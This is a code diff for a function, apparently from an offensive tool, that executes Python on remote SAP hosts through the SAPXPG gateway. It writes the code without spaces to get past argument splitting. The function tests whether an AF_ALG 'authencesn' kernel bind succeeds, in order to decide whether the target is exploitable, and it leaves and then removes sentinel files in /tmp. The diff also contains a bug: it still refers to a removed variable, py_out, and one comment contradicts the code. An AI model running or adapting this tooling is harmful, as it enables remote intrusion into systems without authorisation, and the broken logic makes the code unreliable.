@@ -225,34 +225,62 @@ def check_copyfail(node) -> dict:
     # Check authencesn via AF_ALG bind using long_params (avoids SAPXPG
     # quoting issues — the code string goes in LONG_PARAMS, not PARAMS).
     # Writes /tmp/.cf_chk if bind succeeds; we read it back to confirm.
-    # SAPXPG splits long_params on spaces before passing to python3, so
-    # the code must contain NO spaces.  Use __import__ instead of
-    # 'import socket' (which has a space), and no space in any token.
+    # Rules for long_params code:
+    #  - No spaces (SAPXPG splits on spaces before handing to python3)
+    #  - Use __import__ instead of 'import X' (which has a space)
+    #  - Write a long sentinel (>4 chars) — SAPXPG drops cat output for
+    #    very small files; base64 reads reliably for any size
+    chk_sentinel = "AUTHENCESN_OK_CONFIRMED"
     chk_code = (
         "a=__import__('socket').socket(38,5,0);"
         "a.bind(('aead','authencesn(hmac(sha256),cbc(aes))'));"
-        "f=open('/tmp/.cf_chk','w');f.write('OK');f.flush();f.close();"
+        "f=open('/tmp/.cf_chk','w');f.write('%s');f.flush();f.close();"
         "a.close()"
-    )
-    r_chk = execute_gw_command(node, "python3", "-c", long_params=chk_code)
-    chk_exec_ok = r_chk.get("success", False)
-    chk_out_raw = "\n".join(r_chk.get("output") or []).strip()
-    print(f"[*] {getattr(node,'sid','?')}: copyfail check — python3 "
-          f"exec ok={chk_exec_ok} out={chk_out_raw[:80]!r}")
-    chk_out = _r("cat", "/tmp/.cf_chk")
-    print(f"[*] {getattr(node,'sid','?')}: copyfail check — "
-          f"cf_chk contents={chk_out!r}")
+    ) % chk_sentinel
+    execute_gw_command(node, "python3", "-c", long_params=chk_code)
+    # Read via base64 (cat of small files returns empty on some SAPXPG builds)
+    import base64 as _b64chk
+    b64_raw = _r("base64", "/tmp/.cf_chk")
     _r("rm", "-f /tmp/.cf_chk")
-    result["authencesn_ok"] = chk_out.strip() == "OK"
-    result["details"]["authencesn"] = chk_out
+    if b64_raw and "No such" not in b64_raw:
+        try:
+            padded = b64_raw.replace("\n","").strip()
+            padded += "=" * ((4 - len(padded) % 4) % 4)
+            chk_decoded = _b64chk.b64decode(padded).decode("utf-8","replace")
+        except Exception:
+            chk_decoded = ""
+    else:
+        chk_decoded = ""
+    print(f"[*] {getattr(node,'sid','?')}: copyfail check — "
+          f"authencesn result={chk_decoded!r}")
+    result["authencesn_ok"] = chk_decoded.strip() == chk_sentinel
+    result["details"]["authencesn"] = chk_decoded
 
     if not result["authencesn_ok"]:
         result["reason"] = "authencesn bind failed — AF_ALG not exploitable"
         return result
 
-    py_out = _r("python3", "--version")
-    result["python_ok"] = bool(py_out and "Python 3" in py_out)
-    result["details"]["python"] = py_out
+    # python3 --version may go to stderr; write to file instead
+    execute_gw_command(node, "python3", "-c",
+                       long_params="sys=__import__('sys');"
+                                   "f=open('/tmp/.cf_pyv','w');"
+                                   "f.write(sys.version);f.flush();f.close()")
+    # sys.version has no spaces issue since code is: import sys; (space after import!)
+    # Fall back to --version if file empty
+    py_b64 = _r("base64", "/tmp/.cf_pyv")
+    _r("rm", "-f /tmp/.cf_pyv")
+    if py_b64 and "No such" not in py_b64:
+        try:
+            padded = py_b64.replace("\n","").strip()
+            padded += "=" * ((4 - len(padded) % 4) % 4)
+            py_ver = _b64chk.b64decode(padded).decode("utf-8","replace")
+        except Exception:
+            py_ver = ""
+    else:
+        py_ver = _r("python3", "--version")
+    print(f"[*] {getattr(node,'sid','?')}: copyfail check — python={py_ver[:40]!r}")
+    result["python_ok"] = bool(py_ver and "3" in py_ver)
+    result["details"]["python"] = py_ver
 
     if not result["python_ok"]:
         result["reason"] = f"python3 not available: {py_out!r}"
